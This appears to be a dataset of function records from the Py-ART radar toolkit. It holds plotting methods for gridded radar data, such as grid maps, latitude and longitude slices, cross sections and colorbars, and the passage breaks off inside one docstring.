ARM-DOE/pyart,plot_grid,"def plot_grid(self, field, level=0, vmin=None, vmax=None, norm=None, cmap=None, mask_outside=False, title=None, title_flag=True, axislabels=(None, None), axislabels_flag=False, colorbar_flag=True, colorbar_label=None, colorbar_orient='vertical', ax=None, fig=None, lat_lines=None, lon_lines=None, projection=None, embellish=True, add_grid_lines=True, ticks=None, ticklabs=None, **kwargs):
    """"""
        Plot the grid using xarray and cartopy.

        Additional arguments are passed to Xarray's pcolormesh function.

        Parameters
        ----------
        field : str
            Field to be plotted.
        level : int
            Index corresponding to the height level to be plotted.

        Other Parameters
        ----------------
        vmin, vmax : float
            Lower and upper range for the colormesh. If either parameter is
            None, a value will be determined from the field attributes (if
            available) or the default values of -8, 64 will be used.
            Parameters are used for luminance scaling.
        norm : Normalize or None, optional
            matplotlib Normalize instance used to scale luminance data. If not
            None the vmax and vmin parameters are ignored. If None, vmin and
            vmax are used for luminance scaling.
        cmap : str or None
            Matplotlib colormap name. None will use default colormap for
            the field being plotted as specified by the Py-ART configuration.
        mask_outside : bool
            True to mask data outside of vmin, vmax. False performs no
            masking.
        title : str
            Title to label plot with, None will use the default generated from
            the field and level parameters. Parameter is ignored if the
            title_flag is False.
        title_flag : bool
            True to add title to plot, False does not add a title.
        axislabels : (str, str)
            2-tuple of x-axis, y-axis labels. None for either label will use
            the default axis label. Parameter is ignored if axislabels_flag is
            False.
        axislabels_flag : bool
            True to add label the axes, False does not label the axes.
        colorbar_flag : bool
            True to add a colorbar with label to the axis. False leaves off
            the colorbar.
        colorbar_label : str
            Colorbar label, None will use a default label generated from the
            field information.
        colorbar_orient : 'vertical' or 'horizontal'
            Colorbar orientation.
        ax : Axis
            Axis to plot on. None will use the current axis.
        fig : Figure
            Figure to add the colorbar to. None will use the current figure.
        lat_lines, lon_lines : array or None
            Location at which to draw latitude and longitude lines.
            None will use default values which are reasonable for maps of
            North America.
        projection : cartopy.crs class
            Map projection supported by cartopy. Used for all subsequent calls
            to the GeoAxes object generated. Defaults to PlateCarree.
        embellish : bool
            True by default. Set to False to supress drawing of coastlines
            etc... Use for speedup when specifying shapefiles.
        add_grid_lines : bool
            True by default. Set to False to supress drawing of lat/lon lines
            Note that lat lon labels only work with certain projections.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.

        """"""
    ds = self.grid.to_xarray()
    (vmin, vmax) = common.parse_vmin_vmax(self.grid, field, vmin, vmax)
    cmap = common.parse_cmap(cmap, field)
    if mask_outside:
        data = ds[field].data
        masked_data = np.ma.masked_invalid(data)
        masked_data = np.ma.masked_outside(masked_data, vmin, vmax)
        ds[field].data = masked_data
    if fig is None:
        fig = plt.gcf()
    if ax is not None:
        if hasattr(ax, 'projection'):
            projection = ax.projection
        else:
            if projection is None:
                projection = cartopy.crs.Mercator()
                warnings.warn('No projection was defined for the axes.' + ' Overridding defined axes and using default ' + 'axes with projection Mercator.', UserWarning)
            with warnings.catch_warnings():
                warnings.filterwarnings('ignore')
                ax = plt.axes(projection=projection)
    else:
        if projection is None:
            projection = cartopy.crs.Mercator()
            warnings.warn('No projection was defined for the axes.' + ' Overridding defined axes and using default ' + 'axes with projection Mercator.', UserWarning)
        with warnings.catch_warnings():
            warnings.filterwarnings('ignore')
            ax = plt.axes(projection=projection)
    if norm is not None:
        vmin = vmax = None
    pm = ds[field][0, level].plot.pcolormesh(x='lon', y='lat', cmap=cmap, vmin=vmin, vmax=vmax, add_colorbar=False, **kwargs)
    self.mappables.append(pm)
    self.fields.append(field)
    if embellish:
        states = self.cartopy_states()
        coastlines = self.cartopy_coastlines()
        ax.add_feature(states, linestyle='-', edgecolor='k', linewidth=2)
        ax.add_feature(coastlines, linestyle='-', edgecolor='k', linewidth=2)
    if add_grid_lines:
        if lon_lines is None:
            lon_lines = np.linspace(np.around(ds.lon.min() - 0.1, decimals=2), np.around(ds.lon.max() + 0.1, decimals=2), 5)
        if lat_lines is None:
            lat_lines = np.linspace(np.around(ds.lat.min() - 0.1, decimals=2), np.around(ds.lat.max() + 0.1, decimals=2), 5)
        if ax.projection in [cartopy.crs.PlateCarree(), cartopy.crs.Mercator()]:
            ax.gridlines(draw_labels=False, linewidth=2, color='gray', alpha=0.5, linestyle='--', xlocs=lon_lines, ylocs=lat_lines)
            ax.set_extent([lon_lines.min(), lon_lines.max(), lat_lines.min(), lat_lines.max()], crs=projection)
            ax.set_xticks(lon_lines, crs=projection)
            ax.set_yticks(lat_lines, crs=projection)
        elif isinstance(ax.projection, cartopy.crs.LambertConformal):
            ax.figure.canvas.draw()
            ax.gridlines(xlocs=lon_lines, ylocs=lat_lines)
            ax.xaxis.set_major_formatter(cartopy.mpl.gridliner.LONGITUDE_FORMATTER)
            ax.yaxis.set_major_formatter(cartopy.mpl.gridliner.LATITUDE_FORMATTER)
            if _LAMBERT_GRIDLINES:
                lambert_xticks(ax, lon_lines)
                lambert_yticks(ax, lat_lines)
        else:
            ax.gridlines(xlocs=lon_lines, ylocs=lat_lines)
    if title_flag:
        if title is None:
            ax.set_title(self.generate_grid_title(field, level))
        else:
            ax.set_title(title)
    if axislabels_flag:
        self._label_axes_grid(axislabels, ax)
    if colorbar_flag:
        self.plot_colorbar(mappable=pm, label=colorbar_label, orientation=colorbar_orient, field=field, ax=ax, fig=fig, ticks=ticks, ticklabs=ticklabs)"
ARM-DOE/pyart,plot_crosshairs,"def plot_crosshairs(self, lon=None, lat=None, linestyle='--', color='r', linewidth=2, ax=None):
    """"""
        Plot crosshairs at a given longitude and latitude.

        Parameters
        ----------
        lon, lat : float
            Longitude and latitude (in degrees) where the crosshairs should
            be placed. If None the center of the grid is used.
        linestyle : str
            Matplotlib string describing the line style.
        color : str
            Matplotlib string for color of the line.
        linewidth : float
            Width of markers in points.
        ax : axes or None
            Axis to add the crosshairs to, if None the current axis is used.

        """"""
    ax = common.parse_ax(ax)
    (lon, lat) = common.parse_lon_lat(self.grid, lon, lat)
    ax.axhline(lat, color=color, linestyle=linestyle, linewidth=linewidth)
    ax.axvline(lon, color=color, linestyle=linestyle, linewidth=linewidth)"
ARM-DOE/pyart,plot_latitude_slice,"def plot_latitude_slice(self, field, lon=None, lat=None, **kwargs):
    """"""
        Plot a slice along a given latitude.

        For documentation of additional arguments see
        :py:func:`plot_latitudinal_level`.

        Parameters
        ----------
        field : str
            Field to be plotted.
        lon, lat : float
            Longitude and latitude (in degrees) specifying the slice. If
            None the center of the grid is used.

        """"""
    (_, y_index) = self._find_nearest_grid_indices(lon, lat)
    self.plot_latitudinal_level(field=field, y_index=y_index, **kwargs)"
ARM-DOE/pyart,plot_latitudinal_level,"def plot_latitudinal_level(self, field, y_index, vmin=None, vmax=None, norm=None, cmap=None, mask_outside=False, title=None, title_flag=True, axislabels=(None, None), axislabels_flag=True, colorbar_flag=True, colorbar_label=None, colorbar_orient='vertical', edges=True, ax=None, fig=None, ticks=None, ticklabs=None, **kwargs):
    """"""
        Plot a slice along a given latitude.

        Additional arguments are passed to Basemaps's pcolormesh function.

        Parameters
        ----------
        field : str
            Field to be plotted.
        y_index : float
            Index of the latitudinal level to plot.
        vmin, vmax : float
            Lower and upper range for the colormesh. If either parameter is
            None, a value will be determined from the field attributes (if
            available) or the default values of -8, 64 will be used.
            Parameters are ignored is norm is not None.
        norm : Normalize or None, optional
            matplotlib Normalize instance used to scale luminance data. If not
            None the vmax and vmin parameters are ignored. If None, vmin and
            vmax are used for luminance scaling.
        cmap : str or None
            Matplotlib colormap name. None will use the default colormap for
            the field being plotted as specified by the Py-ART configuration.
        mask_outside : bool
            True to mask data outside of vmin, vmax. False performs no
            masking.
        title : str
            Title to label plot with, None to use default title generated from
            the field and lat,lon parameters. Parameter is ignored if
            title_flag is False.
        title_flag : bool
            True to add a title to the plot, False does not add a title.
        axislabels : (str, str)
            2-tuple of x-axis, y-axis labels. None for either label will use
            the default axis label. Parameter is ignored if axislabels_flag is
            False.
        axislabels_flag : bool
            True to add label the axes, False does not label the axes.
        colorbar_flag : bool
            True to add a colorbar with label to the axis.  False leaves off
            the colorbar.
        colorbar_label : str
            Colorbar label, None will use a default label generated from the
            field information.
        colorbar_orient : 'vertical' or 'horizontal'
            Colorbar orientation.
        edges : bool
            True will interpolate and extrapolate the gate edges from the
            range, azimuth and elevations in the radar, treating these
            as specifying the center of each gate. False treats these
            coordinates themselved as the gate edges, resulting in a plot
            in which the last gate in each ray and the entire last ray are not
            not plotted.
        ax : Axis
            Axis to plot on. None will use the current axis.
        fig : Figure
            Figure to add the colorbar to. None will use the current figure.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.

        """"""
    (ax, fig) = common.parse_ax_fig(ax, fig)
    (vmin, vmax) = common.parse_vmin_vmax(self.grid, field, vmin, vmax)
    cmap = common.parse_cmap(cmap, field)
    data = self.grid.fields[field]['data'][:, y_index, :]
    if mask_outside:
        data = np.ma.masked_invalid(data)
        data = np.ma.masked_outside(data, vmin, vmax)
    x_1d = self.grid.x['data'] / 1000
    z_1d = self.grid.z['data'] / 1000
    if edges:
        if len(x_1d) > 1:
            x_1d = _interpolate_axes_edges(x_1d)
        if len(z_1d) > 1:
            z_1d = _interpolate_axes_edges(z_1d)
    (xd, yd) = np.meshgrid(x_1d, z_1d)
    if norm is not None:
        vmin = vmax = None
    pm = ax.pcolormesh(xd, yd, data, vmin=vmin, vmax=vmax, norm=norm, cmap=cmap, **kwargs)
    self.mappables.append(pm)
    self.fields.append(field)
    if title_flag:
        if title is None:
            ax.set_title(common.generate_latitudinal_level_title(self.grid, field, y_index))
        else:
            ax.set_title(title)
    if axislabels_flag:
        self._label_axes_latitude(axislabels, ax)
    if colorbar_flag:
        self.plot_colorbar(mappable=pm, label=colorbar_label, orientation=colorbar_orient, field=field, ax=ax, fig=fig, ticks=ticks, ticklabs=ticklabs)"
ARM-DOE/pyart,plot_longitude_slice,"def plot_longitude_slice(self, field, lon=None, lat=None, **kwargs):
    """"""
        Plot a slice along a given longitude.

        For documentation of additional arguments see
        :py:func:`plot_longitudinal_level`.

        Parameters
        ----------
        field : str
            Field to be plotted.
        lon, lat : float
            Longitude and latitude (in degrees) specifying the slice.  If
            None the center of the grid is used.

        """"""
    (x_index, _) = self._find_nearest_grid_indices(lon, lat)
    self.plot_longitudinal_level(field=field, x_index=x_index, **kwargs)"
ARM-DOE/pyart,plot_longitudinal_level,"def plot_longitudinal_level(self, field, x_index, vmin=None, vmax=None, norm=None, cmap=None, mask_outside=False, title=None, title_flag=True, axislabels=(None, None), axislabels_flag=True, colorbar_flag=True, colorbar_label=None, colorbar_orient='vertical', edges=True, ax=None, fig=None, ticks=None, ticklabs=None, **kwargs):
    """"""
        Plot a slice along a given longitude.

        Additional arguments are passed to Basemaps's pcolormesh function.

        Parameters
        ----------
        field : str
            Field to be plotted.
        x_index : float
            Index of the longitudinal level to plot.
        vmin, vmax : float
            Lower and upper range for the colormesh. If either parameter is
            None, a value will be determined from the field attributes (if
            available) or the default values of -8, 64 will be used.
            Parameters are ignored is norm is not None.
        norm : Normalize or None, optional
            matplotlib Normalize instance used to scale luminance data. If not
            None the vmax and vmin parameters are ignored. If None, vmin and
            vmax are used for luminance scaling.
        cmap : str or None
            Matplotlib colormap name. None will use the default colormap for
            the field being plotted as specified by the Py-ART configuration.
        mask_outside : bool
            True to mask data outside of vmin, vmax. False performs no
            masking.
        title : str
            Title to label plot with, None to use default title generated from
            the field and lat,lon parameters. Parameter is ignored if
            title_flag is False.
        title_flag : bool
            True to add a title to the plot, False does not add a title.
        axislabels : (str, str)
            2-tuple of x-axis, y-axis labels. None for either label will use
            the default axis label. Parameter is ignored if axislabels_flag is
            False.
        axislabels_flag : bool
            True to add label the axes, False does not label the axes.
        colorbar_flag : bool
            True to add a colorbar with label to the axis. False leaves off
            the colorbar.
        colorbar_label : str
            Colorbar label, None will use a default label generated from the
            field information.
        colorbar_orient : 'vertical' or 'horizontal'
            Colorbar orientation.
        edges : bool
            True will interpolate and extrapolate the gate edges from the
            range, azimuth and elevations in the radar, treating these
            as specifying the center of each gate. False treats these
            coordinates themselved as the gate edges, resulting in a plot
            in which the last gate in each ray and the entire last ray are not
            not plotted.
        ax : Axis
            Axis to plot on. None will use the current axis.
        fig : Figure
            Figure to add the colorbar to. None will use the current figure.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.

        """"""
    (ax, fig) = common.parse_ax_fig(ax, fig)
    (vmin, vmax) = common.parse_vmin_vmax(self.grid, field, vmin, vmax)
    cmap = common.parse_cmap(cmap, field)
    data = self.grid.fields[field]['data'][:, :, x_index]
    if mask_outside:
        data = np.ma.masked_invalid(data)
        data = np.ma.masked_outside(data, vmin, vmax)
    y_1d = self.grid.y['data'] / 1000
    z_1d = self.grid.z['data'] / 1000
    if edges:
        if len(y_1d) > 1:
            y_1d = _interpolate_axes_edges(y_1d)
        if len(z_1d) > 1:
            z_1d = _interpolate_axes_edges(z_1d)
    (xd, yd) = np.meshgrid(y_1d, z_1d)
    if norm is not None:
        vmin = vmax = None
    pm = ax.pcolormesh(xd, yd, data, vmin=vmin, vmax=vmax, norm=norm, cmap=cmap, **kwargs)
    self.mappables.append(pm)
    self.fields.append(field)
    if title_flag:
        if title is None:
            ax.set_title(common.generate_longitudinal_level_title(self.grid, field, x_index))
        else:
            ax.set_title(title)
    if axislabels_flag:
        self._label_axes_longitude(axislabels, ax)
    if colorbar_flag:
        self.plot_colorbar(mappable=pm, label=colorbar_label, orientation=colorbar_orient, field=field, ax=ax, fig=fig, ticks=ticks, ticklabs=ticklabs)"
ARM-DOE/pyart,plot_cross_section,"def plot_cross_section(self, field, start, end, steps=100, interp_type='linear', x_axis=None, vmin=None, vmax=None, norm=None, cmap=None, title=None, title_flag=True, axislabels_flag=True, colorbar_flag=True, colorbar_label=None, colorbar_orient='vertical', ax=None, fig=None, ticks=None, ticklabs=None, **kwargs):
    """"""
        Plot a cross section through a set of given points (latitude,
        longitude).

        This uses the MetPy cross section interpolation function.

        Additional arguments are passed to Matplotlib's pcolormesh function.

        Parameters
        ----------
        field : str
            Field to be plotted.
        start : tuple
            A latitude-longitude pair designating the start point of the cross
            section (units are degrees north and degrees east).
        end : tuple
            A latitude-longitude pair designating the end point of the cross
            section (units are degrees north and degrees east).
        steps: int
            The number of points along the geodesic between the start and the
            end point (including the end points) to use in the cross section.
            Defaults to 100.
        interp_type: str
            The interpolation method, either ‘linear’ or ‘nearest’
            (see xarray.DataArray.interp() for details). Defaults to ‘linear’.
        x_axis: str
            Field to use for plotting along the x-axis (ex. Latitude).
            Defaults to number of points from the first point.
        vmin, vmax : float
            Lower and upper range for the colormesh. If either parameter is
            None, a value will be determined from the field attributes (if
            available) or the default values of -8, 64 will be used.
            Parameters are ignored is norm is not None.
        norm : Normalize or None, optional
            matplotlib Normalize instance used to scale luminance data. If not
            None the vmax and vmin parameters are ignored. If None, vmin and
            vmax are used for luminance scaling.
        cmap : str or None
            Matplotlib colormap name. None will use the default colormap for
            the field being plotted as specified by the Py-ART configuration.
        mask_outside : bool
            True to mask data outside of vmin, vmax. False performs no
            masking.
        title : str
            Title to label plot with, None to use default title generated from
            the field and lat,lon parameters. Parameter is ignored if
            title_flag is False.
        title_flag : bool
            True to add a title to the plot, False does not add a title.
        axislabels : (str, str)
            2-tuple of x-axis, y-axis labels. None for either label will use
            the default axis label. Parameter is ignored if axislabels_flag is
            False.
        axislabels_flag : bool
            True to add label the axes, False does not label the axes.
        colorbar_flag : bool
            True to add a colorbar with label to the axis. False leaves off
            the colorbar.
        colorbar_label : str
            Colorbar label, None will use a default label generated from the
            field information.
        colorbar_orient : 'vertical' or 'horizontal'
            Colorbar orientation.
        ax : Axis
            Axis to plot on. None will use the current axis.
        fig : Figure
            Figure to add the colorbar to. None will use the current figure.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.

        """"""
    if not _METPY_AVAILABLE:
        raise MissingOptionalDependency('MetPy is required to use plot_cross_section but is not ' + 'installed!')
    from metpy.interpolate import cross_section
    (ax, fig) = common.parse_ax_fig(ax, fig)
    (vmin, vmax) = common.parse_vmin_vmax(self.grid, field, vmin, vmax)
    cmap = common.parse_cmap(cmap, field)
    ds = self.grid.to_xarray()
    proj_params = self.grid.get_projparams()
    radar_crs = cartopy.crs.AzimuthalEquidistant(central_longitude=proj_params['lon_0'], central_latitude=proj_params['lat_0'])
    projection_info = radar_crs.to_cf()
    ds = ds.metpy.assign_crs(projection_info)
    ds = cross_section(ds, start, end, steps, interp_type).set_coords(('lat', 'lon'))
    ds['z'] = ds['z'] / 1000
    ds.z.attrs['units'] = 'Distance above radar (km)'
    if x_axis == 'y':
        ds['y'] = ds['y'] / 1000
        ds.y.attrs['units'] = 'North South distance from radar (km)'
    if x_axis == 'x':
        ds['x'] = ds['x'] / 1000
        ds.y.attrs['units'] = 'East West distance from radar (km)'
    plot = ds[field].plot(y='z', x=x_axis, vmin=vmin, vmax=vmax, norm=norm, add_colorbar=False, ax=ax, cmap=cmap, **kwargs)
    self.mappables.append(plot)
    self.fields.append(field)
    if axislabels_flag:
        ax.set_ylabel(ds.z.attrs['units'])
    if title_flag:
        if title is None:
            ax.set_title(common.generate_cross_section_title(self.grid, field, start, end))
        else:
            ax.set_title(title)
    if colorbar_flag:
        self.plot_colorbar(mappable=plot, label=colorbar_label, orientation=colorbar_orient, field=field, ax=ax, fig=fig, ticks=ticks, ticklabs=ticklabs)"
ARM-DOE/pyart,plot_colorbar,"def plot_colorbar(self, mappable=None, orientation='horizontal', label=None, cax=None, ax=None, fig=None, field=None, ticks=None, ticklabs=None):
    """"""
        Plot a colorbar.

        Parameters
        ----------
        mappable : Image, ContourSet, etc.
            Image, ContourSet, etc to which the colorbar applied. If None the
            last mappable object will be used.
        field : str
            Field to label colorbar with.
        label : str
            Colorbar label. None will use a default value from the last field
            plotted.
        orient : str
            Colorbar orientation, either 'vertical' [default] or 'horizontal'.
        cax : Axis
            Axis onto which the colorbar will be drawn. None is also valid.
        ax : Axes
            Axis onto which the colorbar will be drawn. None is also valid.
        fig : Figure
            Figure to place colorbar on. None will use the current figure.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.

        """"""
    if fig is None:
        fig = plt.gcf()
    if mappable is None:
        if len(self.mappables) == 0:
            raise ValueError('mappable must be specified.')
        mappable = self.mappables[-1]
    if label is None:
        if len(self.fields) == 0:
            raise ValueError('field must be specified.')
        field = self.grid.fields[self.fields[-1]]
        if 'long_name' in field and 'units' in field:
            label = field['long_name'] + '(' + field['units'] + ')'
        else:
            label = ''
    cb = fig.colorbar(mappable, orientation=orientation, ax=ax, cax=cax)
    if ticks is not None:
        cb.set_ticks(ticks)
    if ticklabs is not None:
        cb.set_ticklabels(ticklabs)
    cb.set_label(label)"
ARM-DOE/pyart,_find_nearest_grid_indices,"def _find_nearest_grid_indices(self, lon, lat):
    """"""Find the nearest x, y grid indices for a given latitude and
        longitude.""""""
    (lon, lat) = common.parse_lon_lat(self.grid, lon, lat)
    (grid_lons, grid_lats) = self.grid.get_point_longitude_latitude()
    diff = (grid_lats - lat) ** 2 + (grid_lons - lon) ** 2
    (y_index, x_index) = np.unravel_index(diff.argmin(), diff.shape)
    return (x_index, y_index)"
ARM-DOE/pyart,_get_label_x,"def _get_label_x(self):
    """"""Get default label for x units.""""""
    return 'East West distance from ' + self.origin + ' (km)'"
ARM-DOE/pyart,_get_label_y,"def _get_label_y(self):
    """"""Get default label for y units.""""""
    return 'North South distance from ' + self.origin + ' (km)'"
ARM-DOE/pyart,_get_label_z,"def _get_label_z(self):
    """"""Get default label for z units.""""""
    return 'Distance Above ' + self.origin + ' (km)'"
ARM-DOE/pyart,_label_axes_grid,"def _label_axes_grid(self, axis_labels, ax):
    """"""Set the x and y axis labels for a grid plot.""""""
    (x_label, y_label) = axis_labels
    if x_label is None:
        x_label = self._get_label_x()
    if y_label is None:
        y_label = self._get_label_y()
    ax.set_xlabel(x_label)
    ax.set_ylabel(y_label)"
ARM-DOE/pyart,_label_axes_longitude,"def _label_axes_longitude(self, axis_labels, ax):
    """"""Set the x and y axis labels for a longitude slice.""""""
    (x_label, y_label) = axis_labels
    if x_label is None:
        x_label = self._get_label_y()
    if y_label is None:
        y_label = self._get_label_z()
    ax.set_xlabel(x_label)
    ax.set_ylabel(y_label)"
ARM-DOE/pyart,_label_axes_latitude,"def _label_axes_latitude(self, axis_labels, ax):
    """"""Set the x and y axis labels for a latitude slice.""""""
    (x_label, y_label) = axis_labels
    if x_label is None:
        x_label = self._get_label_x()
    if y_label is None:
        y_label = self._get_label_z()
    ax.set_xlabel(x_label)
    ax.set_ylabel(y_label)"
ARM-DOE/pyart,generate_filename,"def generate_filename(self, field, level, ext='png'):
    """"""
        Generate a filename for a grid plot.

        Generated filename has form:
            grid_name_field_level_time.ext

        Parameters
        ----------
        field : str
            Field plotted.
        level : int
            Level plotted.
        ext : str
            Filename extension.

        Returns
        -------
        filename : str
            Filename suitable for saving a plot.

        """"""
    return common.generate_grid_filename(self.grid, field, level, ext)"
ARM-DOE/pyart,generate_grid_title,"def generate_grid_title(self, field, level):
    """"""
        Generate a title for a plot.

        Parameters
        ----------
        field : str
            Field plotted.
        level : int
            Vertical level plotted.

        Returns
        -------
        title : str
            Plot title.

        """"""
    return common.generate_grid_title(self.grid, field, level)"
ARM-DOE/pyart,generate_latitudinal_level_title,"def generate_latitudinal_level_title(self, field, level):
    """"""
        Generate a title for a plot.

        Parameters
        ----------
        field : str
            Field plotted.
        level : int
            Latitudinal level plotted.

        Returns
        -------
        title : str
            Plot title.

        """"""
    return common.generate_latitudinal_level_title(self.grid, field, level)"
ARM-DOE/pyart,generate_longitudinal_level_title,"def generate_longitudinal_level_title(self, field, level):
    """"""
        Generate a title for a plot.

        Parameters
        ----------
        field : str
            Field plotted.
        level : int
            Longitudinal level plotted.

        Returns
        -------
        title : str
            Plot title.

        """"""
    return common.generate_longitudinal_level_title(self.grid, field, level)"
ARM-DOE/pyart,cartopy_states,"def cartopy_states(self):
    """"""Get state boundaries using cartopy.""""""
    return cartopy.feature.NaturalEarthFeature(category='cultural', name='admin_1_states_provinces_lines', scale='50m', facecolor='none')"
ARM-DOE/pyart,cartopy_political_boundaries,"def cartopy_political_boundaries(self):
    """"""Get political boundaries using cartopy.""""""
    return cartopy.feature.NaturalEarthFeature(category='cultural', name='admin_0_boundary_lines_land', scale='50m', facecolor='none')"
ARM-DOE/pyart,cartopy_coastlines,"def cartopy_coastlines(self):
    """"""Get coastlines using cartopy.""""""
    return cartopy.feature.NaturalEarthFeature(category='physical', name='coastline', scale='10m', facecolor='none')"
ARM-DOE/pyart,te,"def te(xy):
    return xy[0]"
ARM-DOE/pyart,lc,"def lc(t, n, b):
    return np.vstack((np.zeros(n) + t, np.linspace(b[2], b[3], n))).T"
ARM-DOE/pyart,te,"def te(xy):
    return xy[1]"
ARM-DOE/pyart,lc,"def lc(t, n, b):
    return np.vstack((np.linspace(b[0], b[1], n), np.zeros(n) + t)).T"
ARM-DOE/pyart,__init__,"def __init__(self, grid, debug=False):
    """"""initalize the object.""""""
    if not _BASEMAP_AVAILABLE:
        raise MissingOptionalDependency('Basemap is required to use GridMapDisplay but is not installed')
    self.grid = grid
    self.debug = debug
    self.mappables = []
    self.fields = []
    self.origin = 'origin'
    self.basemap = None"
ARM-DOE/pyart,plot_basemap,"def plot_basemap(self, lat_lines=None, lon_lines=None, resolution='l', area_thresh=10000, auto_range=True, min_lon=-92, max_lon=-86, min_lat=40, max_lat=44, ax=None, **kwargs):
    """"""
        Plot a basemap.

        Parameters
        ----------
        lat_lines, lon_lines : array or None
            Locations at which to draw latitude and longitude lines.
            None will use default values which are reasonable for maps of
            North America.
        auto_range : bool
            True to determine map ranges from the latitude and longitude
            limits of the grid. False will use the min_lon, max_lon, min_lat,
            and max_lat parameters for the map range.
        min_lat, max_lat, min_lon, max_lon : float
            Latitude and longitude ranges for the map projection region in
            degrees.  These parameter are not used if auto_range is True.
        resolution : 'c', 'l', 'i', 'h', or 'f'.
            Resolution of boundary database to use. See Basemap documentation
            for details.
        area_thresh : int
            Basemap area_thresh parameter. See Basemap documentation.
        ax : axes or None.
            Axis to add the basemap to, if None the current axis is used.
        kwargs: Basemap options
            Options to be passed to Basemap. If projection is not specified
            here it uses proj='merc' (mercator).

        """"""
    self._make_basemap(resolution, area_thresh, auto_range, min_lon, max_lon, min_lat, max_lat, ax, **kwargs)
    if lat_lines is None:
        lat_lines = np.arange(30, 46, 1)
    if lon_lines is None:
        lon_lines = np.arange(-110, -75, 1)
    self.basemap.drawcoastlines(linewidth=1.25)
    self.basemap.drawstates()
    self.basemap.drawparallels(lat_lines, labels=[True, False, False, False])
    self.basemap.drawmeridians(lon_lines, labels=[False, False, False, True])"
ARM-DOE/pyart,plot_grid,"def plot_grid(self, field, level=0, vmin=None, vmax=None, norm=None, cmap=None, mask_outside=False, title=None, title_flag=True, axislabels=(None, None), axislabels_flag=False, colorbar_flag=True, colorbar_label=None, colorbar_orient='vertical', edges=True, ax=None, fig=None, ticks=None, ticklabs=None, **kwargs):
    """"""
        Plot the grid onto the current basemap.

        Additional arguments are passed to Basemaps's pcolormesh function.

        Parameters
        ----------
        field : str
            Field to be plotted.
        level : int
            Index corresponding to the height level to be plotted.
        vmin, vmax : float
            Lower and upper range for the colormesh. If either parameter is
            None, a value will be determined from the field attributes (if
            available) or the default values of -8, 64 will be used.
            Parameters are ignored is norm is not None.
        norm : Normalize or None, optional
            matplotlib Normalize instance used to scale luminance data.  If not
            None the vmax and vmin parameters are ignored. If None, vmin and
            vmax are used for luminance scaling.
        cmap : str or None
            Matplotlib colormap name. None will use the default colormap for
            the field being plotted as specified by the Py-ART configuration.
        mask_outside : bool
            True to mask data outside of vmin, vmax. False performs no
            masking.
        title : str
            Title to label plot with, None to use default title generated from
            the field and level parameters. Parameter is ignored if title_flag
            is False.
        title_flag : bool
            True to add a title to the plot, False does not add a title.
        axislabels : (str, str)
            2-tuple of x-axis, y-axis labels. None for either label will use
            the default axis label. Parameter is ignored if axislabels_flag is
            False.
        axislabels_flag : bool
            True to add label the axes, False does not label the axes.
        colorbar_flag : bool
            True to add a colorbar with label to the axis. False leaves off
            the colorbar.
        colorbar_label : str
            Colorbar label, None will use a default label generated from the
            field information.
        colorbar_orient : 'vertical' or 'horizontal'
            Colorbar orientation.
        edges : bool
            True will interpolate and extrapolate the gate edges from the
            range, azimuth and elevations in the radar, treating these
            as specifying the center of each gate. False treats these
            coordinates themselved as the gate edges, resulting in a plot
            in which the last gate in each ray and the entire last ray are not
            not plotted.
        ax : Axis
            Axis to plot on. None will use the current axis.
        fig : Figure
            Figure to add the colorbar to. None will use the current figure.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.

        """"""
    (ax, fig) = common.parse_ax_fig(ax, fig)
    (vmin, vmax) = common.parse_vmin_vmax(self.grid, field, vmin, vmax)
    cmap = common.parse_cmap(cmap, field)
    basemap = self.get_basemap()
    data = self.grid.fields[field]['data'][level]
    if mask_outside:
        data = np.ma.masked_invalid(data)
        data = np.ma.masked_outside(data, vmin, vmax)
    (lons, lats) = self.grid.get_point_longitude_latitude(edges=edges)
    if norm is not None:
        vmin = vmax = None
    pm = basemap.pcolormesh(lons, lats, data, vmin=vmin, vmax=vmax, cmap=cmap, norm=norm, latlon=True, **kwargs)
    self.mappables.append(pm)
    self.fields.append(field)
    if title_flag:
        if title is None:
            ax.set_title(self.generate_grid_title(field, level))
        else:
            ax.set_title(title)
    if axislabels_flag:
        self._label_axes_grid(axislabels, ax)
    if colorbar_flag:
        self.plot_colorbar(mappable=pm, label=colorbar_label, orientation=colorbar_orient, field=field, ax=ax, fig=fig, ticks=ticks, ticklabs=ticklabs)
    return"
ARM-DOE/pyart,plot_crosshairs,"def plot_crosshairs(self, lon=None, lat=None, line_style='r--', linewidth=2, ax=None):
    """"""
        Plot crosshairs at a given longitude and latitude.

        Parameters
        ----------
        lon, lat : float
            Longitude and latitude (in degrees) where the crosshairs should
            be placed.  If None the center of the grid is used.
        line_style : str
            Matplotlib string describing the line style.
        linewidth : float
            Width of markers in points.
        ax : axes or None.
            Axis to add the crosshairs to, if None the current axis is used.

        """"""
    ax = common.parse_ax(ax)
    (lon, lat) = common.parse_lon_lat(self.grid, lon, lat)
    basemap = self.get_basemap()
    (x_lon, y_lon) = basemap(np.array([lon, lon]), np.array([basemap.latmin, basemap.latmax]))
    (x_lat, y_lat) = basemap(np.array([basemap.lonmin, basemap.lonmax]), np.array([lat, lat]))
    ax.plot(x_lon, y_lon, line_style, linewidth=linewidth)
    ax.plot(x_lat, y_lat, line_style, linewidth=linewidth)
    return"
ARM-DOE/pyart,plot_latitude_slice,"def plot_latitude_slice(self, field, lon=None, lat=None, **kwargs):
    """"""
        Plot a slice along a given latitude.

        For documentation of additional arguments see
        :py:func:`plot_latitudinal_level`.

        Parameters
        ----------
        field : str
            Field to be plotted.
        lon, lat : float
            Longitude and latitude (in degrees) specifying the slice. If
            None the center of the grid is used.

        """"""
    (_, y_index) = self._find_nearest_grid_indices(lon, lat)
    self.plot_latitudinal_level(field=field, y_index=y_index, **kwargs)"
ARM-DOE/pyart,plot_latitudinal_level,"def plot_latitudinal_level(self, field, y_index, vmin=None, vmax=None, norm=None, cmap=None, mask_outside=False, title=None, title_flag=True, axislabels=(None, None), axislabels_flag=True, colorbar_flag=True, colorbar_label=None, colorbar_orient='vertical', edges=True, ax=None, fig=None, ticks=None, ticklabs=None, **kwargs):
    """"""
        Plot a slice along a given latitude.

        Additional arguments are passed to Basemaps's pcolormesh function.

        Parameters
        ----------
        field : str
